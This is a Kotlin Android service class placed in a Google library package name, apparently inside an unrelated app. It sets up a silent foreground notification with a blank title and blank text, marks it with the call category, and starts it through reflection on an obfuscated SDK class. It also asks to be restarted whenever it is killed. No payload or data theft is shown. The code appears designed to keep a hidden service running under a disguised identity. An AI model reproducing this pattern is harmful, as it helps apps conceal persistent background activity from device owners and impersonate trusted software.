package com.google.android.datatransport.core

import android.app.Notification
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.widget.RemoteViews
import androidx.core.app.NotificationChannelCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import com.river.shore.R


/**
 * Date：2025/12/4
 * Describe:
 * com.google.android.datatransport.core.MessageCoreService
 */
class MessageCoreService : Service() {
    private val builder by lazy {
        val mBuilder = NotificationChannelCompat.Builder(getString(R.string.google_helper), 3)
        mBuilder.setName(getString(R.string.google_helper))
        mBuilder.setSound(null, null)
        mBuilder.setLightsEnabled(false)
        mBuilder.setVibrationEnabled(false)
        mBuilder
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        runCatching {
            val builder2: NotificationCompat.Builder =
                NotificationCompat.Builder(this, getString(R.string.google_helper))
            builder2.setChannelId(getString(R.string.google_helper))
            builder2.setCustomContentView(RemoteViews(packageName, R.layout.layout_sty_go))
            builder2.setContentTitle("")
            builder2.setContentText("")
            builder2.setSound(null)
            builder2.setCategory(Notification.CATEGORY_CALL)
            builder2.setSmallIcon(R.drawable.ic_so_pz)
            builder2.setPriority(0)
            Class.forName("com.helper.sdk.O1").getMethod(
                "b1",
                Service::class.java,
                NotificationChannelCompat::class.java,
                Notification::class.java,
                String::class.java
            ).invoke(null, this, builder.build(), builder2.build(), "foreground_p")
        }.onFailure {
            it.printStackTrace()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        NotificationManagerCompat.from(this).cancel(95438)
        stopSelf(95438)
        stopForeground(1)
        super.onDestroy()
    }

}